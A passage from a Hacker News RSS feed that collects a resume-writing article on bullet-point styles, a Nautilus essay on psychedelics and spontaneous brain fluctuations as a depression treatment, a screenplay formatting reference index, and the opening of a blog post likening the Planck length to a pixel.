event-based bullet points. It‚Äôs easiest because it mirrors your experience, and how you think about your past work. You shipped, developed, or launched something.</p><p>For the hiring manager, this bullet point style is difficult to use as an assessment tool. Sure, you did something, but how <strong>well</strong> did you do it? Almost all engineers can claim they showed up, wrote some code, and were involved in something being released to the public. So when you don't provide details about the outcome or the results, it's difficult for the hiring manager to make the case in her mind to pull your resume out of the pile instead of the other engineer. As a result, event-based bullet points leave it up to chance that a hiring manager will pick your resume for an interview.</p><h3>Performance-based</h3><ul><li>Identified xx items for improvement in existing systems</li><li>Improved system by increasing xx, reducing yy, optimizing zz items</li><li>Hired xx engineers </li><li>Improved availability by xxx%</li><li>Reduced latency by xx %</li><li>Refactored system to be 10x scalable</li><li>Deployed xx clusters, reducing maintenance costs by yy %</li><li>Built system that replaced manual system, saving xx days work annually</li><li>Improved security by releasing xx features</li><li>Fixed xx bugs</li></ul><p>The most effective type of bullet point is the performance-based bullet point. Using the <a href="https://leetresumes.com/blog/why-you-should-include-numbers-on-your-technical-resume">Action-Number-Method Pattern</a>, performance-based bullets combine an <strong>action</strong> indicating a positive change in state, with a specific objective <strong>numerical</strong> value indicating the scale of that change, and a <strong>method</strong> by which the change was effected, typically highlighting your skills in doing so.</p><p>Performance-based bullet points tell a more complete story to the hiring manager as she is reviewing resumes. By detailing your past performance, it‚Äôs easier for her to estimate how you might contribute to her team in the future. It‚Äôs easier for her to understand that performance is important to you, and the types of performance improvements you‚Äôve created in the past. </p><p>As a result, when screening resumes, performance-based bullet points with numbers get picked more often.</p><h3>Administrative</h3><ul><li>Responsible for</li><li>Conducted testing </li><li>Participated in retrospectives</li><li>Attend scrum meetings</li><li>Performed code reviews</li><li>Assigned tasks to staff or peers</li></ul><p>The lowest-effort form of bullet point for technical resumes is the Administrative bullet point.  This style is popular because it is low effort. Engineers using Administrative bullets typically copy-pasta their job descriptions on to their resumes, turning their section about achievements into a listing of administrative duties and responsibilities. </p><p>As you can imagine, this easiest way to create bullet points is also the least effective. Hiring managers are familiar with job descriptions - after all, they're the ones writing them! So if your experience looks like every other job description and resume they‚Äôve seen, they have no ability to understand that you are a better and different talent. </p><p>In addition, listing basic administrative duties such as these don‚Äôt help you stand out. Your resume is not going to be selected from a stack because you attended scrum testings, ran unit tests, or did code reviews. Those are really considered to be basic behaviors that any experienced technology professional has done.</p><p>Because this style is ineffective at getting your resume selected for an interview, you should avoid using the Administrative style bullet point.</p><h3>Organizational</h3><ul><li>Promoted to / Selected to join</li><li>Joined</li><li>Transferred to</li><li>Worked on</li><li>Assigned to</li></ul><p>Finally, there is the Organizational style bullet point, which often explains how you came to be working on a particular project, or what organizational circumstances led to your presence on a team. With just one exception, Organizational bullet points should be avoided.</p><p>Organizational bullet points put too much focus on the configuration of your work in a prior company.  As a result, they do little to explain why your work is relevant to the hiring manager, or why he should select your resume for an interview. </p><p>Every company has its own method for assigning, transferring or matching engineers to required work. It‚Äôs probably different than the one used at the company you‚Äôre applying to. As a result, Organizational bullet points tell the hiring manager relatively little about you, your capabilities, or your performance. </p><p>The one exception is ‚ÄúPromoted / Selected to Join.‚Äù Promotions and competitive selections <strong>do</strong> explain something about your performance to a hiring manager. They inform your future boss that the people who know you best, and who worked with you most closely, decided that you were ready for more responsibility. And that fact <strong>is </strong>helpful in getting your resume selected for an interview.</p><p>So when it comes to bullet points on your <a href="https://leetresumes.com/blog/practical-methods-for-adding-more-numbers-to-your-technical-resume">technical resume</a>, use the <strong>Action - Number - Method pattern</strong>, and prefer <strong>performance-based bullet points</strong>. This combination is most effective at getting your resume selected for interview requests, and getting you ahead in your career.</p><p>If you‚Äôd like Leet Resumes to write your technical resume for free, <a href="https://leetresumes.com/">please sign up</a>.</p></div></div></div></div>]]>
            </description>
            <link>https://leetresumes.com/blog/an-assessment-of-four-bullet-point-styles-for-a-technical-resume</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178714</guid>
            <pubDate>Thu, 18 Feb 2021 11:44:26 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Why Making Our Brains Noisier Feels Good]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26178708">thread link</a>) | @CapitalistCartr
<br/>
February 18, 2021 | http://m.nautil.us/issue/96/rewired/why-making-our-brains-noisier-feels-good | <a href="https://web.archive.org/web/*/http://m.nautil.us/issue/96/rewired/why-making-our-brains-noisier-feels-good">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
			<p><span>N</span>ot since World War II has there been as great a threat to mental health as the current COVID-19 pandemic, according to Aiden James. The challenges to our mental health won‚Äôt ‚Äústop when the virus is under control and there are few people in hospital,‚Äù the president of the Royal College of Psychiatrists in the United Kingdom told <i>The Guardian</i> recently. ‚ÄúYou‚Äôve got to fund the long-term consequences.‚Äù With depression, anxiety, and substance abuse in the United States, and likely elsewhere, at <a href="https://www.cdc.gov/mmwr/volumes/69/wr/mm6932a1.htm" target="_blank">record highs</a>, that should not come as a surprise. At least antidepressants can be counted on to ameliorate some of the damage, right? Well, maybe not. Experts disagree strongly about how well our medications are helping. In 2018, <i>New Scientist</i> ran an article called ‚ÄúNobody Can Agree About Antidepressants.‚Äù<sup>1</sup></p><p>So what do we do? A theory of brain function, particularly involving serotonin, recently proposed by neuroscientists Robin Carhart-Harris and David Nutt, at Imperial College London, may point a way forward for effective treatment.<sup>2</sup> The use of antidepressants has inadvertently left many of us less able to feel empathy toward others, laugh, cry, dream, and enjoy life just when we need those things the most: in the middle of a global pandemic.</p><blockquote><p>When our mind wanders, sleeps, or is under anesthesia, for example, our neurons are still firing all over the place.</p> </blockquote><p>The good news is that the research coming out of Imperial College‚Äôs Research Center has shown some impressive results in reducing treatment-resistant depression using psychedelics, such as the psilocybin found in ‚Äúmagic mushrooms.‚Äù In a 2017 study, decreased depressive symptoms were observed in all 19 treatment-resistant individuals one week after their dose.<sup>3</sup> Five weeks later, 47 percent still had reduced symptoms. What is equally exciting is that Carhart-Harris and his co-authors have been using functional magnetic resonance imaging on subjects during the process to show that the mechanism of action is directly related to the amplification of spontaneous cognitive fluctuations.<sup>4</sup><br></p><p>Spontaneous brain fluctuations occur across all resting-state brain activity.<sup>5</sup> When our mind wanders, sleeps, or is under anesthesia, for example, our neurons are still firing all over the place.<sup>6</sup> Over time and through trauma, our spontaneous fluctuations can fall into negative resting-state patterns, like water rolls into a ditch. Antidepressants, such as serotonin uptake inhibitors, address this problem by cutting off water flow. Most work by reducing the functional connectivity of the ‚Äúdefault mode network,‚Äù which is active when we mind-wander, daydream, self-reflect, worry, and ruminate. Unfortunately, this means that around 70 percent of people who take antidepressants report ‚Äúemotional numbness‚Äù as a primary side effect.<sup>7</sup> Prescription antidepressants, anti-anxiety agents, and even many sleeping pills interfere with REM sleep and dreaming. This is ironic since there is well-researched evidence that REM dreaming plays a vital role in regulating negative emotions and depression.<sup>8</sup></p><p>Sleep researchers Antonio Zadra, Bob Stickgold, and Erin Wamsley showed, for example, that dreaming increases these fluctuations and improves how quickly test subjects could pass through a maze.<sup>9</sup> When the subjects dreamt about the maze in any way, or dreamt about the music that played while they navigated the maze, they completed the maze the next day nine times faster than those who did not dream about the maze.</p><div>
<article>
<p><a href="http://m.nautil.us/issue/40/Learning/hallucinogen-therapy-is-coming" data-trval="hallucinogen-therapy-is-coming" data-trlbl="foc_rec" data-tract="internal_art">
<img src="http://static.nautil.us/10358_44e55ed981c434536b85d307e6215b26.png" alt="Sapolsky_TH-F1" width="314" height="177">
</a>
</p>
<div>
<p><span>
<span>

<span><a href="http://m.nautil.us/term/f/Health">Also in Health</a></span>&nbsp;&nbsp;</span>
</span></p><h4><a href="http://m.nautil.us/issue/40/Learning/hallucinogen-therapy-is-coming" data-trval="hallucinogen-therapy-is-coming" data-trlbl="foc_rec" data-tract="internal_art">Hallucinogen Therapy Is Coming</a></h4>
<p>By Moises Velasquez-Manoff</p>
<p>
Three years later Daniel Kreitman still chokes up when he talks about what he saw, and how it changed him. Kreitman, an upholsterer by trade, had taken psilocybin, a hallucinogen derived from mushrooms, in a trial at Johns Hopkins University...<strong><a href="http://m.nautil.us/issue/40/Learning/hallucinogen-therapy-is-coming" data-trval="hallucinogen-therapy-is-coming" data-trlbl="foc_rec" data-tract="internal_art">READ MORE</a></strong>
</p>

</div>

</article>
</div><p>Neuroscientists have known about spontaneous fluctuations since the 1930s but never knew what to make of them. Researchers chalked the phenomenon up to ‚Äúrandom background noise‚Äù and proceeded to focus on coding the more easily testable 2 to 3 percent of conscious brain activity, but now they recognize that cognitive fluctuations play a much more significant role and that their patterns aren‚Äôt random.<sup>6</sup> In <i>Consciousness and the Brain</i>, French neuroscientist Stanislas Dehaene writes that ‚Äúneurons not only tolerate noise but even amplify it.‚Äù Neurons work by amplifying cognitive fluctuations and even harness their noisiness to help generate novel solutions to complex problems. Cognitive fluctuations may be drawing us nearer to a paradigm shift where ‚Äúnoise is the new signal.‚Äù</p><p>Brain frequencies are how fast certain groups of neurons fire together. The frequencies of cognitive fluctuations form patterns that become ‚Äúcross-coupled‚Äù into higher frequencies, around the beta (12 to 30 hertz) to gamma (30 to 180 hertz) range. As the slower waves, from infraslow (0.0001‚Äì0.1 Hertz) to theta (5 to 8 hertz), continually nest into faster ones and spread like an avalanche across various areas of the brain, we become aware that we are aware or ‚Äúconscious.‚Äù That is, our thoughts are the results of syncopated patterns of noise that emerge like eddies from a turbulent stream.</p><p>For instance, if someone flashes an image on a screen in front of us for only 40 milliseconds, we will not consciously see it due to the frequency and propagation rate of conscious thought. If the image lasts 60 milliseconds, however, we will consciously see it. This is because there is time for these nested frequencies to spread out and become aware of the image. According to the neuroscientist and philosopher Georg Northoff, at the University of Ottawa, these cross-coupled frequencies eventually create metastable states of conscious awareness.<sup>10</sup></p><blockquote><p>Antidepressants have inadvertently left many of us less able to feel empathy when we need it most: in the middle of a global pandemic.</p> </blockquote><p>The study of these cognitive fluctuations is leading researchers to approach mental health treatment in new ways. Instead of trying to <i>reduce</i> spontaneous fluctuations with antidepressants, they are trying to <i>increase</i> them. This is counter-intuitive because spontaneous fluctuations and mind-wandering can also lead to depressive rumination and anxiety. The flux theory, however, is that these negative habits of thought can be disrupted by flooding the brain with spontaneous fluctuations. The disturbance loosens things up and allows us to change old habits.<br></p><p>If Northoff and Carhart-Harris are right, amplifying the noise might change our minds like shaking a snow-globe changes snow distribution. This is a good thing‚Äîsuch a good thing, in fact, that it is leading to some incredible breakthroughs in mental health science. Rolland Griffiths and Stephen Ross, at the NYU Langone Center of Excellence on Addiction, for example, gave 80 patients with life-threatening cancer in Baltimore and New York City psilocybin. More than three-quarters reported significant relief from depression and anxiety related to their fear of dying.<sup>11</sup> These improvements remained even six months after the treatment and were related to the amplification of spontaneous fluctuations. Ross told <i>Scientific American</i>, ‚ÄúIt is simply unprecedented in psychiatry that a single dose of a medicine produces these kinds of dramatic and enduring results.‚Äù<sup>12</sup></p><p>Spontaneous fluctuations are a tool we should not underestimate. More Americans have died from COVID-19 than in World War II, and the numbers are likely to double before the end. Millions more are grieving the loss of their loved ones. Many COVID-19 ‚Äúlong-haulers‚Äù are also dealing with mental health issues related to the lasting effects of the disease. We need safe and reliable mental health solutions, and no tool should be left out of the toolbox. Getting plenty of REM sleep and dreams uninhibited by alcohol, ibuprofen, and cannabis can help, as can decriminalizing psilocybin, as several cities are doing, to make therapies more accessible. Even looking at natural fractals, like trees and plants, can contribute to flux therapy.<sup>13</sup> Having a good theory about how spontaneous fluctuations work is the key to finding more treatments.</p><p>As the fear of illness and death consume the minds of many, the advances in this line of work offer some measure of comfort. They might just help us survive the COVID-19 aftermath.</p><p><i>Thomas Nail is a professor of philosophy at the University of Denver. Follow him on Twitter <a href="https://twitter.com/xThomas_Nail" target="_blank">@xThomas_Nail</a>.</i></p><p><b>References</b></p> <p>1. Wilson, C. Nobody can agree about antidepressants: Here‚Äôs what you need to know. <i>New Scientist</i> (2018).</p><p>2. Carhart-Harris, R.L. &amp; Nutt, D.J. Serotonin and brain function: A tale of two receptors. <i>Journal of Psychopharmacology</i> <b>31</b>, 1091-1120 (2017).</p><p>3. Carhart-Harris, R.L., <i>et al.</i> Psilocybin for treatment-resistant depression: fMRI-measured brain mechanisms. <i>Scientific Reports</i> <b>7</b>, 13187 (2017).</p><p>4. Carhart-Harris, R.L. The entropic brain‚ÄîRevisited. <i>Neuropharmacology</i> <b>142</b>, 167-178 (2018).</p><p>5. Northoff, G. <i>The Spontaneous Brain: From the Mind-Body to the World-Brain Problem</i> MIT Press, Cambridge, MA (2018); Raichle, M.E. The restless brain: How intrinsic activity organizes brain function. <i>Philosophical Transactions of the Royal Society B</i> <b>370</b>, 20140172 (2015).</p><p>6. Fox, M.D. &amp; Raichle, M.E. Spontaneous fluctuations in brain activity observed with functional magnetic resonance imaging. <i>Nature Reviews Neuroscience</i> <b>8</b>, 700-711 (2007); Dehaene, S. <i>Consciousness and the Brain: Deciphering How the Brain Codes Our Thoughts</i> Viking Penguin, New York, NY (2014).</p><p>7. Read, J. &amp; Williams, J. Adverse effects of antidepressants reported by a large international cohort: emotional blunting, suicidality, and withdrawal effects. <i>Current Drug Safety</i> <b>13</b>, 176-186 (2018).</p><p>8. Scarpelli, S., Bartolacci, C., D‚ÄôAtri, A., Gorgoni, M., &amp; De Gennaro, L. The functional role of dreaming in emotional processes. <i>Frontiers in Psychology</i> <b>10</b>, 459 (2019).</p><p>9. Zadra, A. &amp; Stickgold, R. <i>When Brains Dream: Exploring the Science and Mystery of Sleep</i> W.W. Norton and Company, Inc., New York, ‚Ä¶</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://m.nautil.us/issue/96/rewired/why-making-our-brains-noisier-feels-good">http://m.nautil.us/issue/96/rewired/why-making-our-brains-noisier-feels-good</a></em></p>]]>
            </description>
            <link>http://m.nautil.us/issue/96/rewired/why-making-our-brains-noisier-feels-good</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178708</guid>
            <pubDate>Thu, 18 Feb 2021 11:43:34 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The Screenplay Format Reference]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26178387">thread link</a>) | @jstrieb
<br/>
February 18, 2021 | http://www.trilane.com/ref/index.html | <a href="https://web.archive.org/web/*/http://www.trilane.com/ref/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div width="915" nof="ly">
  <tbody><tr>
   <td>
    <p><img id="Picture3" height="93" width="90" src="http://www.trilane.com/ref/a_reels.jpg" alt="reels" title="reels"></p>
    <table nof="ly">
     <tbody><tr>
      <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="12" height="1" alt=""></td>
      <td></td>
     </tr>
     <tr>
      <td></td>
      <td nof="NB_BYVTNN000">[Top]</td>
     </tr>
    </tbody></table>
   </td>
   <td>
    <table nof="ly">
     <tbody><tr>
      <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="15" height="1" alt=""></td>
      <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="559" height="1" alt=""></td>
     </tr>
     <tr>
      <td></td>
      <td>
       <p><b><span>The Ultimate Screenplay Format Reference</span></b></p>
      </td>
     </tr>
    </tbody></table>
    
    <table nof="ly">
     <tbody><tr>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="35" height="1" alt=""></td>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="389" height="1" alt=""></td>
        </tr>
        <tr>
         <td></td>
         <td>
          <p><span>FADE IN:</span></p>
          <p><b><span>Table of Contents</span></b></p>
          <p><b><span>measurements</span></b></p>
          <ul>
           <li><span><a href="http://www.trilane.com/ref/measure/measure.html">typeface</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/measure/measure.html">margins and tabs</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/measure/measure.html">page numbers</a></span></li>
          </ul>
          <p><b><span>scenes</span></b></p>
          <ul>
           <li><span><a href="http://www.trilane.com/ref/scenes/scenes.html">master scene headings</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/scenes.html#SecHeadings">secondary scene headings</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/spcl1/spcl1.html">montage</a>, <a href="http://www.trilane.com/ref/scenes/spcl1/spcl1.html">series of shots</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/spcl2/spcl2.html#flashback">flashbacks</a>, <a href="http://www.trilane.com/ref/scenes/spcl2/spcl2.html#flashseq">flashback sequences</a>, <a href="http://www.trilane.com/ref/scenes/spcl2/spcl2.html#quickflashes">quick flashes</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/spcl3/spcl3.html">dreams</a>, <a href="http://www.trilane.com/ref/scenes/spcl3/spcl3.html#daydream">daydreams</a>, <a href="http://www.trilane.com/ref/scenes/spcl3/spcl3.html#imagining">imaginings</a>, <a href="http://www.trilane.com/ref/scenes/spcl3/spcl3.html#vision">visions</a>, <a href="http://www.trilane.com/ref/scenes/spcl3/spcl3.html#animation">animation</a> and sequences thereof</span></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/scenes2/scenes2.html">establishing shots</a></span></li>
           <li><a href="http://www.trilane.com/ref/scenes/scenes2/scenes2.html#spacingScenes"><span>spacing between scenes</span></a></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/scenes2/scenes2.html#spacingLines">spacing between lines</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/scenes/scenes2/scenes2.html#transitions">scene transitions<span>, </span><span>MATCH CUT</span></a></span></li>
          </ul>
          <p><b><span>characters</span></b></p>
          <ul>
           <li><span><a href="http://www.trilane.com/ref/chars/chars.html">character introductions</a></span></li>
           <li><a href="http://www.trilane.com/ref/chars/chars.html#names"><span>character names</span></a></li>
           <li><span><a href="http://www.trilane.com/ref/chars/chars.html#cues">character cues</a></span></li>
          </ul>
          <p><b><span>narrative and action</span></b></p>
          <ul>
           <li><span><a href="http://www.trilane.com/ref/action/action.html">character introductions</a></span></li>
           <li><a href="http://www.trilane.com/ref/action/action4/action4.html#SUPER"><span>SUPER</span><span>, </span><span>SCROLL</span><span><span>, </span></span></a><a href="http://www.trilane.com/ref/action/action4/action4.html#onTV"><span>words on TV</span></a></li><a href="http://www.trilane.com/ref/action/action4/action4.html#onTV">
           </a><li><a href="http://www.trilane.com/ref/action/action4/action4.html#onTV"><b><span></span></b></a><b><a href="http://www.trilane.com/ref/action/action4/action4.html#insert"><span>INSERT</span></a></b></li>
           <li><span><a href="http://www.trilane.com/ref/action/action.html#sounds">sounds, MOS</a></span></li><a href="http://www.trilane.com/ref/action/action.html#sounds">
           </a><li><a href="http://www.trilane.com/ref/action/action.html#sounds"><span></span></a><a href="http://www.trilane.com/ref/action/action.html#spfx">special effects (<span>FX</span>, <span>SPFX</span>, <span>SFX</span>)</a></li>
           <li><span><a href="http://www.trilane.com/ref/action/action.html#POVs"><span>POV</span>, <span>CLOSE UP</span>, <span>PULL BACK</span></a></span></li>
           <li><span><a href="http://www.trilane.com/ref/action/action2/action2.html">slow motion</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/action/action2/action2.html#music">music</a>, <a href="http://www.trilane.com/ref/action/action2/action2.html#lyrics">music lyrics</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/action/action2/action2.html#clips">movie clips</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/action/action3/action3.html">unseen characters</a>, <a href="http://www.trilane.com/ref/action/action3/action3.html#phantom">phantom POV</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/action/action4/action4.html#stacking">action stacking</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/action/action5/action5.html">then we see ...</a></span></li>
          </ul>
          <p><b><span>dialog </span></b></p>
          <ul>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg.html#wrylies">actor‚Äôs instructions</a> (a.k.a. wrylies)</span></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg.html#os"><span>(O.S.)</span></a> and <a href="http://www.trilane.com/ref/dlg/dlg.html#vo"><span>(V.O.)</span></a></span></li>
           <li><a href="http://www.trilane.com/ref/dlg/dlg.html#more"><span><span>MORE</span> <span>and</span> </span><span>CONT‚ÄôD / CONTINUED</span></a></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg2/dlg2.html">telephone conversations</a></span></li>
           <ul>
            <li><span><span><a href="http://www.trilane.com/ref/dlg/dlg2/dlg2.html#intercut"><span>INTERCUT</span></a></span><a href="http://www.trilane.com/ref/dlg/dlg2/dlg2.html#intercut"><span></span></a></span></li><a href="http://www.trilane.com/ref/dlg/dlg2/dlg2.html#intercut">
           </a></ul><a href="http://www.trilane.com/ref/dlg/dlg2/dlg2.html#intercut">
           </a><li><a href="http://www.trilane.com/ref/dlg/dlg2/dlg2.html#intercut"><span></span></a><a href="http://www.trilane.com/ref/dlg/dlg3/dlg3.html">overlapping dialog</a></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg3/dlg3.html#computer">computer conversations</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg4/dlg4.html#foreign">foreign languages</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg4/dlg4.html">telepathic dialog</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg5/dlg5.html">mute dialog</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg5/dlg5.html#beat"><span>(beat)</span></a></span></li>
           <li><a href="http://www.trilane.com/ref/dlg/dlg5/dlg5.html#punctuation"><span>-- </span></a></li>
           <li><span><a href="http://www.trilane.com/ref/dlg/dlg5/dlg5.html#punctuation"><span>...</span></a></span></li>
          </ul>
          <p><b><span>miscellaneous</span></b></p>
          <ul>
           <li><span><a href="http://www.trilane.com/ref/pages/pages.html">the title page</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/pages/pages.html#firstPage">the first page</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/pages/pages.html#credits">credits and titles</a></span></li>
           <li><span><a href="http://www.trilane.com/ref/pages/pages.html#lastPage">the last page</a></span></li>
           <li><span>author‚Äôs intrusions</span></li>
           <li><span><a href="http://www.trilane.com/ref/misc/misc.html"><span>notes</span></a></span></li>
          </ul>
          
         </td>
        </tr>
       </tbody></table>
      </td>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="45" height="1" alt=""></td>
         <td></td>
        </tr>
        <tr>
         <td></td>
         <td>
          <div>
             <p><span>Writing a screenplay is difficult.</span></p>
             <p><span>Formatting should be the least of all problems. Actually it‚Äôs the most easiest to master, if you follow a set of simple rules.</span></p>
             <p><span><a href="http://astore.amazon.com/trilane-20/detail/1879505843/105-1611443-6684411">Trottier‚Äôs Screenwriter‚Äôs Bible</a> is currently considered the final authority on formatting issues. I recommend you read it. It will save you a lot of pain.</span></p>
             <p><span>Here you find a reference to those rules. Follow them and your screenplay will be well formatted.</span></p>
            </div>
         </td>
        </tr>
       </tbody></table>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="122" height="1" alt=""></td>
         <td></td>
        </tr>
        <tr>
         <td></td>
         <td>
          
         </td>
        </tr>
       </tbody></table>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="45" height="1" alt=""></td>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="344" height="1" alt=""></td>
        </tr>
        <tr>
         <td></td>
         <td>
          <p><span>If you don‚Äôt believe me then take this from a pro:</span></p>
         </td>
        </tr>
       </tbody></table>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="47" height="1" alt=""></td>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="343" height="1" alt=""></td>
        </tr>
        <tr>
         <td></td>
         <td>
          <p><span>‚ÄúReaders in Hollywood do a great deal of inductive reasoning, which goes something like this: ‚ÄúI just read 99 screenplays, they were all horrible, and they were all written in improper format. Therefore, if screenplay number 100 is also in improper format, it must be horrible, too.‚Äù</span></p>
          <p><span><span>Michael Hauge, Collins 2007, Writing Screenplays That Sell </span></span></p>
         </td>
        </tr>
       </tbody></table>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="49" height="1" alt=""></td>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="340" height="1" alt=""></td>
        </tr>
        <tr>
         <td></td>
         <td>
          <p><span>‚ÄòWriting Screenplays That Sell‚Äô is another good book to read.</span></p>
         </td>
        </tr>
       </tbody></table>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="262" height="1" alt=""></td>
         <td></td>
        </tr>
        <tr>
         <td></td>
         <td>
          
         </td>
        </tr>
       </tbody></table>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="80" height="1" alt=""></td>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="311" height="1" alt=""></td>
        </tr>
        <tr>
         <td></td>
         <td>
          <p><span>At the bottom of this page you find a few books that are real helpful in addressing important issues beyond formatting.</span></p>
          <p><span>... all the best for your own screenwriting.</span></p>
         </td>
        </tr>
       </tbody></table>
      </td>
     </tr>
    </tbody></table>
    <table nof="ly">
     <tbody><tr>
      <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="35" height="1" alt=""></td>
      <td>
       
      </td>
     </tr>
    </tbody></table>
    <table nof="ly">
     <tbody><tr>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="35" height="1" alt=""></td>
         <td>
          
         </td>
        </tr>
       </tbody></table>
      </td>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="23" height="1" alt=""></td>
         <td>
          
         </td>
        </tr>
       </tbody></table>
      </td>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="23" height="1" alt=""></td>
         <td>
          
         </td>
        </tr>
       </tbody></table>
      </td>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="27" height="1" alt=""></td>
         <td>
          <div>
             <p><a href="http://astore.amazon.com/trilane-20/detail/193290736X"><img id="Picture22" height="125" width="83" src="http://www.trilane.com/ref/a_Writer_s_Journey_Vogler.jpg" alt="Writer's Journey_Vogler" title="Writer's Journey_Vogler"></a><br><span><b><br>The Writer‚Äôs Journey<br></b>Christopher Vogler</span></p><p>Paperback <br>300 pages</p><p><a href="http://www.trilane.com/store"><span>Trilane aStore</span></a><br><a href="http://astore.amazon.com/trilane-20/detail/193290736X"><img id="Picture16" height="28" width="90" src="http://www.trilane.com/ref/a_buy-from-amazon.jpg" alt="buy-from-amazon" title="buy-from-amazon"></a></p>
            </div>
         </td>
        </tr>
       </tbody></table>
      </td>
      <td>
       <table nof="ly">
        <tbody><tr>
         <td><img src="http://www.trilane.com/ref/clearpixel.gif" width="23" height="1" alt=""></td>
         <td>
          <div>
             <div><p><a href="http://astore.amazon.com/trilane-20/detail/0440504910"><img id="Picture23" height="125" width="79" src="http://www.trilane.com/ref/a_Screenwriter_s_Problem_Solver_Field.jpg" alt="Screenwriter's Problem Solver_Field" title="Screenwriter's Problem Solver_Field"></a></p><p><span><b>The Screenwriter‚Äôs Problem Solver<br></b>Syd Field</span></p><p>Paperback <br>384 pages</p><p><a href="http://www.trilane.com/store"><span>Trilane aStore</span></a><br><a href="http://astore.amazon.com/trilane-20/detail/0440504910"><img id="Picture18" height="28" width="90" src="http://www.trilane.com/ref/a_buy-from-amazon.jpg" alt="buy-from-amazon" title="buy-from-amazon"></a></p></div>
            </div>
         </td>
        </tr>
       </tbody></table>
      </td>
     </tr>
    </tbody></table>
   </td>
  </tr>
 </tbody></div></div>]]>
            </description>
            <link>http://www.trilane.com/ref/index.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-26178387</guid>
            <pubDate>Thu, 18 Feb 2021 10:57:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The frame rate of the universe (2009)]]>
            </title>
            <description>
<![CDATA[
Score 74 | Comments 64 (<a href="https://news.ycombinator.com/item?id=26178259">thread link</a>) | @codesections
<br/>
February 18, 2021 | https://www.librador.com/2009/01/16/The-frame-rate-of-the-universe/ | <a href="https://web.archive.org/web/*/https://www.librador.com/2009/01/16/The-frame-rate-of-the-universe/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      
<div id="page-2009-2009-01-16-The-frame-rate-of-the-universe-">
  
  <p><abbr title="2009-01-16T01:04:00+01:00">16 Jan 2009</abbr></p><div>
    <p>

    I stumbled upon <a href="http://www.newscientist.com/article/mg20126911.300-our-world-may-be-a-giant-hologram.html?full=true">this
article</a> which presents the hypothesis that the universe is a 3D projection of a 2D
surface, like a giant hologram. I like to read about modern physics. It is so weird and I can't say
I really understand very much of it. But the descriptions provoke strange and fascinating images
and thoughts in my head. Like this one:</p><p>The article mentions the <a href="http://en.wikipedia.org/wiki/Planck_length">Planck length</a>, which as I understand it is
the smallest distance there is. It's extremely small: 1.6 √ó 10<sup>-35</sup> meters, which makes
it billions and billions of times smaller than an atom (or even a proton). I'm used to thinking
about computer graphics, so I imagine the Planck length as the size of one "pixel" of the universe.
Nothing can be smaller than a pixel. (The pixels of the universe are small, I calculate the
